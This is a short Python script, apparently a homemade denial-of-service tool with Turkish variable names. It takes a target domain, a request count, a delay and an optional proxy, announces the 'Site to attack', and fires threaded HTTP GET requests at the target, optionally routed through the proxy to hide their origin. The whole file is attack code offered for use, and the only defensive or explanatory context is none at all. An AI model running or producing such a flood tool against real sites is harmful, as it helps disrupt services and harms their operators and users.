import sys
import requests  # type: ignore
import threading
import time

def tamamlama1(input_url):
    return f"http://www.{input_url}"

def tamamlama2(input_url):
    return f"http://www.{input_url}"

if __name__ == "__main__":
    url = sys.argv[1]
    cevap1 = int(sys.argv[2])
    sayı = int(sys.argv[3])
    slep = int(sys.argv[4])
    p = sys.argv[5]

    if cevap1 == 1:
        url1 = tamamlama1(url)
        print(f"Site to attack: {url1}")
    elif cevap1 == 2:
        url1 = tamamlama2(url)
        print(f"Site to attack: {url1}")
    else:
        print("Error: Number not detected")
        exit()

    proxy = {"http": f"http://{p}"} if p != 'n' else {}

    def send_request():
        try:
            response = requests.get(url1)
            if response.status_code == 200:
                print("Status Information: Successful")
            else:
                print(f"Error: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    def send_request1():
        try:
            response = requests.get(url1, proxies=proxy)
            if response.status_code == 200:
                print("Status Information: Successful")
            else:
                print(f"Error: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    threads = []
    for i in range(sayı):
        if p == "n":
            thread = threading.Thread(target=send_request)
        else:
            thread = threading.Thread(target=send_request1)
        threads.append(thread)
        thread.start()
        time.sleep(slep)

    for thread in threads:
        thread.join()
